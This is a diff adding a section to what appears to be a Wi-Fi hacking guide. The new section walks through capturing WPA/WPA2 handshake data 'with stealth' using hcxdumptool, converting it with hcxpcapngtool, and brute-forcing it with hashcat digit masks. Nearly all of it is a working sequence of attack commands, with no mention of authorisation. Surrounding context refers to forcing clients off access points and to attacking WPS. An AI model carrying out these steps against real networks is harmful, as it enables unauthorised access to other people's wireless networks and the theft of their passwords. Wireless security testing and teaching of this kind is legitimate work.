@@ -73,6 +73,68 @@ Now that you have the handshake, you can use a cracking program like `hashcat` t
 
 `hashcat -m 16800 file.cap /user/share/dictionary/passwords.txt`
 
+## Using stealth to capure the 4-way handshake
+Forcing clients to disconnect from the AP is intrusive, fortunately there is a better method which can be used.
+
+First, we need to disable the Network Manager
+
+`sudo systemctl stop NetworkManager.service`
+`sudo systemctl stop wpa_supplicant.service`
+
+### Capture packets
+Then use `hcxdumptool` to capture packets
+
+`sudo hcxdumptool -i <interface> -o dumpfile.pcapng --active_beacon --enable_status=15`
+
+Leave this running for a few minutes to capture enough data.
+
+Where:   
+`<interface>`      - The wireless interface to capture packets
+`dumpfile.pcapng`  - The file that will contain captured data
+
+### Capture BSSIDs
+Next, capture a list of BSSIDs using `hcxdumptool`
+
+`sudo hcxdumptool --do_rcascan -i <interface>`
+
+Where:   
+`<interface>`      - The wireless interface to capture packets
+
+This will write out to the console a list of BSSIDs and ESSIDs like:
+
+|BSSID       |FREQ  |CH | RSSI |BEACON |RESPONSE |ESSID   |
+|------------|------|---|------|-------|---------|--------|
+|3a8954495f80|2466  |11 |-46   |480    | 349     | Oskar  |
+|a0321a6e2a43|5034  | 6 |-48   |665    | 239     | Xion   |
+|5856ce52c5f6|2466  |11 |-38   |601    | 140     | HT105T |
+|92355c0bca3c|5284  |56 |-72   | 37    | 103     | Car    |
+|807543a448a2|5009  | 1 |-38   | 58    |  67     | Skynet |
+ 
+
+Next enable the Network Manager again
+
+`sudo systemctl start NetworkManager.service`
+`sudo systemctl start wpa_supplicant.service`
+
+### Convert packet to use with hashcat
+The output from hcxdumptool created a file called `dumpfile.pcapng`. This file needs to be converted into a format that hashcat can use to crack the WPA/WPA2 data.
+
+`hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng`
+
+Where:   
+`hash.hc22000`    - The output file for hashcat
+`dumpfile.pcapng` - The input file, created by hxcdumptool
+
+The resulting file `hash.hc2200` may contain multiple entries. Remove all entries, except the ones containing the BSSID you are interested in cracking.
+
+### Using hashcat to crack WPA/WPA-2
+
+`hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d` 
+
+Where:   
+`hash.hc2200` - The file containing WPA/WPA-2 data
+
+`hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d` 
 
 
 ## Attacking WPS
